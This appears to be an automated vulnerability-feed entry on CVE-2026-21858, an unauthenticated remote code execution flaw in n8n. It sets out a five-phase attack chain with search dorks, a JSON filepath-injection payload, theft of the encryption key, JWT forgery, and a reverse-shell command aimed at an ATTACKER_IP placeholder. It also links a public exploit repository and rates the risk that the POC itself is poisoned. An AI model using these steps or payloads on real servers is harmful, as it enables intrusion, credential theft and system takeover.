## CVE-2026-21858 - n8n Remote Code Execution (RCE)

**漏洞编号:** CVE-2026-21858

**漏洞类型:** Remote Code Execution (RCE)

**影响应用:** n8n

**危害等级:** Critical

**CVSS评分:** 9.8

**影响版本:** 1.65.0 to 1.121.0

**利用条件:** Unauthenticated, Remote network access to n8n Webhook Service (default port 5678), No user interaction required.

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** Low

**投毒风险:** 10%

## 详情

POC Effectiveness Analysis:
The `ATTACKVECTOR.md` document for CVE-2026-21858, dubbed "Ni8mare," presents an exceptionally thorough and lucid explanation of a complete remote code execution (RCE) vulnerability within the n8n workflow automation platform. This detailed exposition is highly effective as a Proof of Concept (POC) because it meticulously deconstructs the attack into a logical five-phase kill chain: Reconnaissance & Discovery, Weaponization through Content-Type Confusion, Data Exfiltration via Arbitrary File Read, Exploitation leveraging Session Forgery, and finally, Installation leading to RCE. The document's strength lies in its granularity, providing specific examples of payloads—such as the exact JSON structure for filepath injection and the precise Bash command for a reverse shell. It also clearly outlines critical contextual information, including the targeted service (n8n Webhook Service on its default port 5678) and the precise range of affected n8n versions (from 1.65.0 to 1.121.0). The explicit mention in search result 6 of a public GitHub repository (`https://github.com/Chocapikk/CVE-2026-21858.git`) and the corresponding instructions to clone and execute a Python exploit script (`python exploit.py`) strongly confirm the availability of a functional, script-based exploitation tool. This synergy between comprehensive documentation and a practical implementation elevates the POC's effectiveness significantly. The `ATTACKVECTOR.md` essentially acts as a detailed operational manual for this tool, guiding an attacker or a security researcher through every step of the compromise, from an initial unauthenticated entry point to achieving full administrative control and arbitrary command execution. The exploit systematically leverages foundational security weaknesses, including improper input validation (identified as CWE-20 in the NVD search result) and an inherent, dangerous trust in configuration settings. These combined flaws contribute to a robust and highly reliable attack vector. The method described for extracting sensitive data, specifically the `N8N_ENCRYPTION_KEY`, and subsequently using it to forge JSON Web Tokens (JWTs) for a complete authentication bypass, exposes a critical flaw in n8n's session management. This flaw permits an attacker to assume Owner/Admin privileges effortlessly. The culmination of the attack in the RCE phase, utilizing n8n's own workflow execution capabilities to inject and run arbitrary commands, offers a potent and stealthy mechanism for compromising the underlying system. In summary, this POC is of exceptional quality, demonstrating a fully automatable and highly impactful exploitation path.

Exploitation Steps:
The exploitation of CVE-2026-21858, a severe vulnerability within the n8n platform, unfolds through a precise, multi-stage attack sequence:

1.  **Phase 1: Reconnaissance & Discovery (T1595)**: The initial phase involves identifying vulnerable n8n instances exposed to the internet. Attackers employ advanced search techniques, often referred to as "dorking," using platforms like Shodan or Censys to query for specific HTML content (`http.html:"n8n"`) or page titles (`http.title:"n8n - Login"`) indicative of n8n installations. Concurrently, they focus on discovering active webhook endpoints, particularly those configured with the "Form Webhook node," which serves as the entry point for the attack chain. During this stage, attackers also perform version fingerprinting by inspecting HTTP headers or static files to ascertain if the target n8n instance falls within the critically vulnerable version range of 1.65.0 to 1.121.0.

2.  **Phase 2: Weaponization - Content-Type Confusion (T1190)**: This phase represents the crucial initial compromise. The vulnerability resides in n8n's `parseRequestBody()` function, which fails to correctly differentiate between `multipart/form-data` and `application/json` payloads when processing HTTP requests. An attacker exploits this logic flaw by sending a specially crafted JSON payload to a webhook endpoint that is typically designed to handle file uploads. The JSON payload is engineered to include a user-defined `filepath` parameter, such as `{"filepath": "/home/node/.n8n/config", "mimetype": "application/json", "filename": "pwn.json"}`. Crucially, the n8n system erroneously interprets this user-supplied `filepath` as the intended destination for an uploaded file, thereby enabling an arbitrary file write operation to system-controlled or sensitive directories.

3.  **Phase 3: Data Exfiltration - Arbitrary File Read (T1083)**: Following the successful arbitrary file write, the attacker proceeds to exfiltrate critical system information. This is achieved by leveraging another vulnerable function, `prepareFormReturnItem()`, which inconveniently copies content from a specified `filepath` to a publicly accessible n8n folder. By directing this function to read from sensitive files previously targeted for arbitrary writes (e.g., `/home/node/.n8n/config`, which contains the vital `N8N_ENCRYPTION_KEY`, or `database.sqlite`, which often stores user hashes), the attacker can retrieve highly confidential system data. The primary objective at this juncture is the acquisition of the static system encryption key, which is pivotal for subsequent exploitation.

4.  **Phase 4: Exploitation - Session Forgery (T1550.004)**: Armed with the stolen `N8N_ENCRYPTION_KEY`, the attacker can now craft and sign a legitimate-looking JSON Web Token (JWT). n8n utilizes the HS256 algorithm for signing its JWTs, which are typically stored in a cookie named `n8n-auth`. By generating a valid JWT using the compromised encryption key, the attacker effectively bypasses the entire authentication mechanism. This grants them immediate and complete administrative access, assuming Owner/Admin privileges within the n8n instance, without needing any valid user credentials.

5.  **Phase 5: Installation - RCE via Workflow (T1059.003)**: With full administrative control established, the attacker moves to achieve remote code execution. This is accomplished by interacting with the n8n REST API to create and activate a new workflow. Within this workflow, a specific component—the "Execute Command or Code Node" (typically a Node.js execution node)—is employed. The attacker then injects a malicious command, such as a reverse shell payload (e.g., `bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1`), into this node. Upon execution of the workflow, the injected command is run on the underlying server, granting the attacker a persistent shell connection and full control over the compromised system.

Poisoning Risk Analysis:
The assessment of "poisoning risk" for CVE-2026-21858, based on the provided `ATTACKVECTOR.md` document and associated public information, indicates a notably low risk. The term "poisoning risk" here refers specifically to the potential for the Proof of Concept (POC) code or documentation itself to harbor hidden malicious functionalities, such as backdoors, malware, or unintended actions against the system of the security researcher or user attempting to replicate the vulnerability. The `ATTACKVECTOR.md` is presented as a clear, comprehensive textual description of the vulnerabilities and the step-by-step methodology for exploitation. Crucially, it does not contain any executable code directly. It serves as a blueprint, outlining the exact payloads and commands required to compromise a target n8n instance and achieve remote code execution. The document maintains a high degree of transparency in its explanation of the attacker's techniques. While search result 6 mentions an external GitHub repository (`https://github.com/Chocapikk/CVE-2026-21858.git`) and a Python exploit script (`python exploit.py`), without direct access to this script, the analysis relies on the detailed description. In the context of legitimate defensive security research, such publicly disclosed exploit scripts are typically designed to be auditable, straightforward, and directly implement the described attack chain. Their primary function is to demonstrate or test the vulnerability on a *target system*, not to covertly harm the *host system* running the POC. There are no elements within the `ATTACKVECTOR.md` that suggest code obfuscation, suspicious external network requests originating from the conceptual POC, or any anomalous command lines that could indicate a hidden trap for the user. The reverse shell command depicted (e.g., `bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1`) is the *consequence* of successful RCE on the *vulnerable target server*, not a malicious action performed by the POC script itself on the researcher's machine. Therefore, based on the transparent and detailed nature of the provided documentation, the risk of this particular POC being intentionally "poisoned" with hidden malware or unintended malicious side effects is assessed as low, approximately 10%. This allows for a minimal residual risk, acknowledging that sourcing any external code, even from seemingly reputable public repositories, always carries a theoretical, albeit small, inherent risk that warrants caution and due diligence (e.g., reviewing the code before execution).

**项目地址:** https://github.com/Chocapikk/CVE-2026-21858.git

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2026-21858
